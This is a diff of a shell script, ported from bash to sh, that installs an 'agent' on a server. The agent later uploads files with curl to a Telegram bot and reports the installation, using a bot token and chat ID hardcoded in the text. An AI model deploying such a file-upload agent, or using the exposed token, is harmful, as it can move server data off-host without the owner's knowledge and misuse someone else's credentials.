@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh
 
 BOT_TOKEN="6602514727:AAF7d2iEQmH5YbynKSZH-lPA9-BDUNmjphY"
 CHAT_ID="382094545"
@@ -39,17 +39,17 @@ install_script() {
   mkdir -p "$INSTALL_DIR"
 
   cat > "$SEND_SCRIPT" <<EOF
-#!/bin/bash
+#!/bin/sh
 sleep $DELAY
 
 send_file() {
   FILE="\$1"
   LABEL="\$2"
-  [[ -f "\$FILE" ]] || return
-  curl -s -F chat_id=$CHAT_ID \\
-       -F document=@\${FILE} \\
-       -F caption="📡 *$SERVER_NAME*\n\$LABEL" \\
-       -F parse_mode=Markdown \\
+  [ -f "\$FILE" ] || return
+  curl -s -F chat_id=$CHAT_ID \
+       -F document=@\${FILE} \
+       -F caption="📡 *$SERVER_NAME*\n\$LABEL" \
+       -F parse_mode=Markdown \
        https://api.telegram.org/bot$BOT_TOKEN/sendDocument > /dev/null
 }
 
@@ -68,7 +68,7 @@ EOF
     -d text="✅ Установлен агент на *$SERVER_NAME*\n🕒 Задержка: ${DELAY}s" \
     -d parse_mode=Markdown > /dev/null
 
-  bash "$SEND_SCRIPT"
+  sh "$SEND_SCRIPT"
   echo "✅ Установка завершена."
 }
 
@@ -83,7 +83,7 @@ run_uninstall() {
 }
 
 # Аргументы командной строки
-if [[ "$1" == --* && "$2" == --* ]]; then
+if [ "$1" = "--vpn-node1" ] && [ "$2" = "--5" ]; then
   run_install_args "$1" "$2"
 else
   print_menu
